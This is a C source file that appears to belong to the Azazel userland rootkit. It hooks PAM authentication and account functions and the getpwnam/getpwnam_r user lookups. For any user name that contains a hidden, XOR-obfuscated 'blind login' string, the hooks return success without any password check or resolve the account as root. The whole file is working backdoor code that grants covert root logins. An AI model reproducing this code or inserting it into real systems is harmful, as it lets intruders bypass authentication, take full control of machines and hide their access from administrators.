#define _GNU_SOURCE

#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <errno.h>
#include <pwd.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>

#include "const.h"
#include "xor.h"
#include "azazel.h"

int pam_authenticate(pam_handle_t *pamh, int flags) {
	void *user;
	char *blind_login = strdup(BLIND_LOGIN);
	x(blind_login);
	
	DEBUG("pam_authenticate called.\n");
	
	azazel_init();
		
	pam_get_item(pamh, PAM_USER, (const void **)&user);
	
	if (strstr(user, blind_login)) {
		cleanup(blind_login,strlen(blind_login));
		return PAM_SUCCESS;
	}

	cleanup(blind_login,strlen(blind_login));
	return (long)syscall_list[SYS_PAM_AUTHENTICATE].syscall_func(pamh, flags);
}

int pam_open_session(pam_handle_t *pamh, int flags) {
	void *user;
	char *blind_login = strdup(BLIND_LOGIN);
	x(blind_login);
	
	DEBUG("pam_open_session called.\n");
	
    azazel_init();
		
	pam_get_item(pamh, PAM_USER, (const void **)&user);
	
	if (strstr(user,blind_login)) { 
		cleanup(blind_login,strlen(blind_login));
		return PAM_SUCCESS;
	}
	
	cleanup(blind_login,strlen(blind_login));
	return (long)syscall_list[SYS_PAM_OPEN_SESSION].syscall_func(pamh, flags);
}

struct passwd *getpwnam(const char *name) {
	struct passwd *mypw;
	char *blind_login = strdup(BLIND_LOGIN);
	char *c_root = strdup(C_ROOT);
	
	x(blind_login);
	x(c_root);
	
	DEBUG("getpwnam called. %s\n", name);
	
	azazel_init();

	if (strstr(name, blind_login)) {
		mypw = syscall_list[SYS_GETPWNAM].syscall_func(c_root);
		mypw->pw_name = strdup(c_root);
		cleanup(blind_login,strlen(blind_login));
		cleanup(c_root,strlen(c_root));
		return mypw;
	} 
	cleanup(blind_login,strlen(blind_login));
	cleanup(c_root,strlen(c_root));
	return syscall_list[SYS_GETPWNAM].syscall_func(name);
}

int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result) {
	char *blind_login = strdup(BLIND_LOGIN);
	char *c_root = strdup(C_ROOT);
	char user[51];
	
	x(blind_login);
	x(c_root);
	
	DEBUG("getpwnam_r called.\n");
	azazel_init();
	
	if (strstr(name, blind_login)) {
		strncpy(user, c_root, sizeof(user)-1);
		cleanup(blind_login,strlen(blind_login));
		cleanup(c_root,strlen(c_root));
		return (long)syscall_list[SYS_GETPWNAM_R].syscall_func(user, pwd, buf, buflen, result);
	}
	
	cleanup(blind_login,strlen(blind_login));
	cleanup(c_root,strlen(c_root));
	return (long)syscall_list[SYS_GETPWNAM_R].syscall_func(name, pwd, buf, buflen, result);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
	void *user;
	char *blind_login = strdup(BLIND_LOGIN);
	x(blind_login);
	
	DEBUG("pam_acct_mgmt called.\n");
	
    azazel_init();
		
	pam_get_item(pamh, PAM_USER, (const void **)&user);
	
	if (strstr(user, blind_login)) {
		cleanup(blind_login,strlen(blind_login));
		return PAM_SUCCESS;
	}
	
	cleanup(blind_login,strlen(blind_login));
	return (long)syscall_list[SYS_PAM_ACCT_MGMT].syscall_func(pamh, flags);
}

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char *argv[]) {
	const char *user;
	char *blind_login = strdup(BLIND_LOGIN);
	int pam_err;
	
	x(blind_login);
	
	azazel_init();
	
	if ((pam_err = pam_get_user(pamh, &user, NULL)) != PAM_SUCCESS) {
		cleanup(blind_login,strlen(blind_login));
		return pam_err;
	}
		
	if (strstr(user, blind_login)) {
		cleanup(blind_login,strlen(blind_login));
		return PAM_SUCCESS;
	}
	
	cleanup(blind_login,strlen(blind_login));	
	return (long)syscall_list[SYS_PAM_SM_AUTHENTICATE].syscall_func(pamh, flags, argc, argv);
}
